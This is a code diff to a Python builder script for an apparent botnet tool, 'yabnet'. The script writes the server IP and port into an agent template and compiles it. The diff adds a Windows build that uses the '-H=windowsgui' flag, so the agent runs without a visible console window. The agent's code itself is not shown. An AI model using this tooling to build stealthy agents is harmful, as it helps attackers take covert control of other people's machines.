@@ -77,7 +77,16 @@ def generate(template, newfile, serverip, port):
 # Need to implement windows freezing 
 # env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui agent.go
 # Check for agent.exe ! 
-def freeze(windows=False):
+def freeze(windows):
+    """
+    Description: Freeze (it's compiling really, but chose a wrong terminology) the .go file into an executable. 
+    Params:
+        - (bool) windows = Boolean which decides if the executable will be compiled for windows or not. 
+            True - Windows 
+            False - *Nix 
+    """
+
+    # Check if we are in windows. If so, check for GOPATH 
     cmd = "where" if platform.system() == "Windows" else "which"
     try:
         subprocess.call([cmd, "go"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -87,12 +96,24 @@ def freeze(windows=False):
 
     print_green("[+] Golang is installed.")
     print_green("[+] Using go agent to freeze and create static executable...")
-    try:
-        subprocess.Popen('go build -o /opt/yabnet/agent/agent /opt/yabnet/agent/agent.go', stderr=subprocess.PIPE, shell=True)
-        print_green("[+] Freezing was successful. Check /opt/yabnet/agent/agent")
-    except Exception as e:
-        print_red("[-] " + str(e))
-        exit()
+
+    if windows:
+        try:
+            print_green("[+] Windows selected. Compiling into windows executable...")
+            subprocess.Popen('env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui -o /opt/yabnet/agent/agent.exe /opt/yabnet/agent/agent.go', stderr=subprocess.PIPE, shell=True)
+            print_green("[+] Freezing was successful. Check /opt/yabnet/agent/agent.exe")
+        except Exception as e:
+            print_red("[-] " + str(e))
+            exit()
+    
+    else:
+
+        try:
+            subprocess.Popen('go build -o /opt/yabnet/agent/agent /opt/yabnet/agent/agent.go', stderr=subprocess.PIPE, shell=True)
+            print_green("[+] Freezing was successful. Check /opt/yabnet/agent/agent")
+        except Exception as e:
+            print_red("[-] " + str(e))
+            exit()
     
 
 
@@ -119,7 +140,7 @@ def freeze_python():
         print_red("[-] " + str(e))
         exit()
 
-def generateNfreeze(ip, port, freezeBool):
+def generateNfreeze(ip, port, freezeBool, windowsBool):
     # HARDCODING FTW (shouldn't do this) 
     TEMPLATE = '/opt/yabnet/agent/agent.txt'
     NEWFILE = '/opt/yabnet/agent/agent.go'
@@ -131,7 +152,7 @@ def generateNfreeze(ip, port, freezeBool):
 
     # Freeze the agent file, if the user wants 
     if freezeBool:
-        freeze()
+        freeze(windowsBool)
 
 """
 def main():
